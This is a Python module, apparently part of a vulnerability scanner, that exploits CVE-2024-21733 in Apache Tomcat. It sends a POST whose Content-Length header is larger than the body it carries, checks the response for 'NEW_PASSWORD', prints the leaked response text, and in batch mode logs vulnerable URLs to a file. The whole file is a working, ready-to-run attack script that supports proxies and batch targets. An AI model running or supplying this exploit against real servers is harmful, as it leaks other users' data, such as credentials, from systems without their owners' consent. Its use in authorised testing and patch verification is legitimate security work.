#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2024_21733:
    def get_url(self,input_url):
        try:
            url = input_url
            headers = {
                "Host": input_url.split("://")[-1],
                'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Linux"',
                'Upgrade-Insecure-Requests': '1',
                "User-Agent": self.headers["User-Agent"],
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Priority": "u=0, i",
                "Connection": "keep-alive",
                "Content-Length": "6",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = "X"
            req = requests.post(url,headers=headers,proxies=self.proxy,verify=self.ssl,data=data)
            if req.status_code == 200 and "NEW_PASSWORD" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Apache", '目标存在Apache Tomcat信息泄露漏洞')
                    OutPrintInfo("Apache", url)
                    OutPrintInfo("Apache", f"响应:\n{req.text.strip()}")

                else:
                    OutPrintInfoSuc("Apache", f'目标存在Apache Tomcat信息泄露漏洞: {url}')
                    OutPutFile("apache_2024_21733.txt",f'目标存在Apache Tomcat信息泄露漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f'目标 {input_url} 不存在Apache Tomcat信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Apache",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Apache", '开始检测Apache Tomcat信息泄露漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Apache", 'Apache Tomcat信息泄露漏洞检测结束')

